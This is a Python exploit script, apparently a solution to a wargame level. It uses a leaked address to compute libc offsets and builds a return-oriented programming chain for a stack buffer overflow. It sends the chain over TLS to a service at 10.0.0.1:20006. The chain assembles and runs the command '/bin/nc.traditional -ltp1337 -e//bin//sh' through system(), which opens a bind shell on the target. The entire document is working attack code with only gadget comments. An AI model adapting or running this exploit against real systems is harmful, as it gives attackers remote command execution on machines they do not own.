#!/usr/bin/env python
import socket
from struct import *
import time
import ssl
import threading
import sys

TCP_IP = '10.0.0.1'
TCP_PORT = 20006
BUFFER_SIZE = 1024

leakedaddr = int(sys.argv[1], 16)
reladdr = (int(pack("<I", leakedaddr).encode("hex"), 16) - 0x55c)
esi = pack("<I", reladdr)

diff = 0x178edc
libcbase = reladdr - diff

bof = "A"*60 
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += esi
bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x00178020) # @ .data
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "/bin"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x00178024) # @ .data + 4
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "/nc."
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x00178028) # @ .data + 8
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "trad"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x0017802c) # @ .data + 12
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "itio"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x00178030) # @ .data + 16
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "nal "
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x00178034) # @ .data + 20
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "-ltp"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x00178038) # @ .data + 24
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "1337"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x0017803c) # @ .data + 28
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += " -e/"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x0017803f) # @ .data + 32
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "/bin"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000e0097) # pop %ecx | pop %ebx | ret
bof += pack("<I", libcbase + 0x00178043) # @ .data + 36
bof += pack("<I", 0x42424242) # padding
bof += pack("<I", libcbase + 0x000238df) # pop %eax | ret
bof += "//sh"
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x000328e0) # xor %eax,%eax | ret
bof += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
bof += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
bof += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
bof += pack("<I", libcbase + 0x0014a0df) # inc %ecx | ret
bof += pack("<I", libcbase + 0x0006cc5a) # mov %eax,(%ecx) | ret

bof += pack("<I", libcbase + 0x0003cb20) # system()
bof += pack("<I", libcbase + 0x000329e0) # exit()
bof += pack("<I", libcbase + 0x00178020) # @ .data

bof += "Z"*440

s_plain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_plain.connect((TCP_IP, TCP_PORT))
s = ssl.wrap_socket(s_plain, ca_certs='level06.pem',
                               cert_reqs=ssl.CERT_REQUIRED,
                               ssl_version=ssl.PROTOCOL_TLSv1)
data = s.recv(BUFFER_SIZE)
print "1: %s" % (data)

s.send("s A -2")
s.send(bof)
